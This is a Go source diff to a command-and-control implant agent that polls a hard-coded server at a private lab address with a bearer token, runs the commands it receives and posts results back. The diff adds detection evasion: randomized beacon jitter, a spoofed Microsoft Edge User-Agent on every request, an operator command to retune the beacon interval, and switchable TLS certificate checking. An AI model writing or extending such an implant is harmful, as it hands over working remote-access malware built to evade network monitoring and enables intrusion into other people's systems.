@@ -15,6 +15,7 @@ import (
     "image/png"
     "io/ioutil"
     "log"
+     mrand "math/rand"
     "net"
     "net/http"
     "net/url"
@@ -44,6 +45,14 @@ var (
     serverURL        = "http://192.168.56.101:5000"
     bearerToken      = "Azerty112345678"
 )
+
+var (
+    beaconMin = 10
+    beaconMax = 30
+    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
+    tlsInsecureSkipVerify = true // set to false in prod if you want real cert check
+)
+
 
 type Command struct {
     ID  string `json:"id"`
@@ -92,31 +101,39 @@ func main() {
         })
 
 */
-    ticker := time.NewTicker(10 * time.Second)
+go func() {
+    mrand.Seed(time.Now().UnixNano())
+    for {
+        // use the latest values of beaconMin/beaconMax
+        interval := mrand.Intn(beaconMax-beaconMin+1) + beaconMin
+        time.Sleep(time.Duration(interval) * time.Second)
 
-    go func() {
-        for range ticker.C {
-            mu.Lock()
-            if !isCommandRunning {
-                isCommandRunning = true
-                mu.Unlock()
+        mu.Lock()
+        if !isCommandRunning {
+            isCommandRunning = true
+            mu.Unlock()
 
-                cmd, err := fetchCommand(agentID)
-                if err != nil {
-                    log.Printf("Error fetching command: %v", err)
-                    continue
-                }
-                if cmd.ID != "" {
-                    executeCommandAndSendResult(cmd)
-                }
-
+            cmd, err := fetchCommand(agentID)
+            if err != nil {
+                log.Printf("Error fetching command: %v", err)
                 mu.Lock()
                 isCommandRunning = false
-        }
+                mu.Unlock()
+                continue
+            }
+            if cmd.ID != "" {
+                executeCommandAndSendResult(cmd)
+            }
+
+            mu.Lock()
+            isCommandRunning = false
+            mu.Unlock()
+        } else {
             mu.Unlock()
         }
-    }()
-
+    }
+}()
+ 
     select {} // Prevent the application from exiting immediately.
 }
 
@@ -131,9 +148,11 @@ func fetchCommand(agentID string) (Command, error) {
     // Add hard-coded Bearer token for authentication
     req.Header.Set("Authorization", "Bearer "+bearerToken)
     req.Header.Set("X-Agent-ID", agentID)
+    req.Header.Set("User-Agent", userAgent)
+
 
     tr := &http.Transport{
-        TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ⚠ For local testing only
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: tlsInsecureSkipVerify}, // ⚠ For local testing only
     }
     client := &http.Client{
         Transport: tr,
@@ -183,9 +202,11 @@ func sendResult(result CommandResult) {
     req.Header.Set("Authorization", "Bearer "+bearerToken)
     req.Header.Set("Content-Type", "application/json")
     req.Header.Set("X-Agent-ID", agentID) // use global variable here
+    req.Header.Set("User-Agent", userAgent)
+
 
     tr := &http.Transport{
-        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: tlsInsecureSkipVerify},
     }
     client := &http.Client{
         Transport: tr,
@@ -268,6 +289,8 @@ func executeCommandAndSendResult(cmd Command) {
     case cmd.Cmd == "reverse_proxy_stop":
          stopReverseProxy()
          sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy stop signal sent."})
+    case strings.HasPrefix(cmd.Cmd, "beacon "):
+         updateBeaconInterval(cmd)
     default:
         executeOtherCommand(cmd)
     }
@@ -401,7 +424,20 @@ func listScheduledTask(cmd Command) {
 }
 
 func publicIp(cmd Command) {
-    resp, err := http.Get("https://ipinfo.io/ip")
+    req, err := http.NewRequest("GET", "https://ipinfo.io/ip", nil)
+    if err != nil {
+        sendResult(CommandResult{
+            ID:     cmd.ID,
+            Result: fmt.Sprintf("Error creating request: %v", err),
+        })
+        return
+    }
+
+    // ✅ Set Microsoft Edge User-Agent
+    req.Header.Set("User-Agent", userAgent)
+
+    client := &http.Client{Timeout: 5 * time.Second}
+    resp, err := client.Do(req)
     if err != nil {
         sendResult(CommandResult{
             ID:     cmd.ID,
@@ -984,3 +1020,30 @@ func sanitizeHost(s string) string {
     return b.String()
 }
 
+func updateBeaconInterval(cmd Command) {
+    args := strings.TrimPrefix(cmd.Cmd, "beacon ")
+    parts := strings.Fields(args)
+    var newMin, newMax int
+    for _, p := range parts {
+        if strings.HasPrefix(p, "min=") {
+            fmt.Sscanf(p, "min=%d", &newMin)
+        } else if strings.HasPrefix(p, "max=") {
+            fmt.Sscanf(p, "max=%d", &newMax)
+        }
+    }
+
+    if newMin <= 0 || newMax <= 0 || newMin >= newMax {
+        sendResult(CommandResult{
+            ID:     cmd.ID,
+            Result: "❌ Invalid beacon range. Use: beacon min=10 max=30 (min < max)",
+        })
+        return
+    }
+
+    beaconMin = newMin
+    beaconMax = newMax
+    sendResult(CommandResult{
+        ID:     cmd.ID,
+        Result: fmt.Sprintf("✅ Beacon interval updated: min=%d, max=%d", beaconMin, beaconMax),
+    })
+}
